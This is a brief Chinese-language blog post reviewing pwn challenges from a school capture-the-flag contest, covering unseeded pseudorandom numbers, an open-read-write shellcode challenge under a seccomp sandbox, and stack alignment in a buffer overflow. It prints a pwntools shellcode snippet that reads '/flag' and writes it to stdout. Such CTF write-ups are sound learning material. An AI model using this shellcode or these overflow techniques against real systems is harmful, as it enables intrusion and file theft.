# 校赛Pwn复盘


# random

伪随机数，这个没用种子的话输出是一样的

# orw

本质是读取一段shellcode后直接执行，问题在于有沙箱机制（看题解知道是seccomp机制）

这里要知道的是orw的固定shellcode

```python
shellcode=asm(shellcraft.amd64.open('/flag'))# 打开一个名为'/flag'的文件
shellcode+=asm(shellcraft.amd64.read('rax'，'rsp'，0x40))# 读取该文件的内容
shellcode+=asm(shellcraft.amd64.write(1，'rsp'，0x40))# 将内容写入到标准输出（即屏幕）
```

这里实际上是将flag的内容直接读入栈顶，挺好理解的，这种写法的话可以不用记shellcode

# bof

关于栈对齐的问题：可以直接加`ret`或者返回到`call _system`，都可以保持栈平衡

待续


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/10/%E6%A0%A1%E8%B5%9Bpwn%E5%A4%8D%E7%9B%98/  

